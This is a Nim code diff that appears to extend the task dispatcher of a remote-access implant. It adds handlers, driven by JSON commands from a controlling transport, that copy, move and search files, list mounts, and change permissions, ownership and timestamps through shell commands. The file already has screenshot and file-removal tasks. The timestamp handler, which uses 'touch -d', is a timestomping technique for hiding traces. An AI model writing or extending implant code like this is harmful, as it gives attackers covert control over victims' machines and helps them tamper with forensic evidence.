@@ -2145,6 +2145,53 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       t.sendResult(id, "[+] removed", "")
     except: t.sendResult(id, "", "rm: " & getCurrentExceptionMsg())
 
+  of "CP", "MV":
+    try:
+      let j = parseJson(args)
+      let src = j{"src"}.getStr()
+      let dst = j{"dst"}.getStr()
+      if src == "" or dst == "":
+        t.sendResult(id, "", "usage: {src,dst}")
+      elif typ == "CP":
+        copyFile(src, dst)
+        t.sendResult(id, "[+] cp " & src & " → " & dst, "")
+      else:
+        moveFile(src, dst)
+        t.sendResult(id, "[+] mv " & src & " → " & dst, "")
+    except: t.sendResult(id, "", typ.toLowerAscii() & ": " & getCurrentExceptionMsg())
+
+  of "GREP":
+    try:
+      let j = parseJson(args)
+      let pat = j{"pattern"}.getStr()
+      let path = j{"path"}.getStr(".")
+      if pat == "":
+        t.sendResult(id, "", "usage: {pattern,path}")
+      else:
+        when defined(windows):
+          t.sendResult(id, runShell("findstr /spin /c:" & quoteShell(pat) & " " & quoteShell(path) & " 2>&1"), "")
+        else:
+          t.sendResult(id, runShell("grep -R -n -- " & quoteShell(pat) & " " & quoteShell(path) & " 2>&1"), "")
+    except: t.sendResult(id, "", "grep: " & getCurrentExceptionMsg())
+
+  of "MOUNT":
+    when defined(windows): t.sendResult(id, runShell("mountvol 2>&1"), "")
+    else: t.sendResult(id, runShell("mount 2>&1"), "")
+
+  of "CHMOD", "CHOWN", "CHTIMES":
+    try:
+      let j = parseJson(args)
+      let path = j{"path"}.getStr()
+      when defined(windows):
+        t.sendResult(id, "", typ.toLowerAscii() & ": not supported on Windows")
+      else:
+        let cmd = case typ
+          of "CHMOD": "chmod " & quoteShell(j{"mode"}.getStr()) & " " & quoteShell(path)
+          of "CHOWN": "chown " & quoteShell(j{"owner"}.getStr() & (if j{"group"}.getStr() != "": ":" & j{"group"}.getStr() else: "")) & " " & quoteShell(path)
+          else: "touch -d " & quoteShell(j{"mtime"}.getStr()) & " " & quoteShell(path)
+        t.sendResult(id, runShell(cmd & " 2>&1"), "")
+    except: t.sendResult(id, "", typ.toLowerAscii() & ": " & getCurrentExceptionMsg())
+
   of "SCREENSHOT":
     let (data, noDesktop) = doScreenshot()
     if noDesktop:
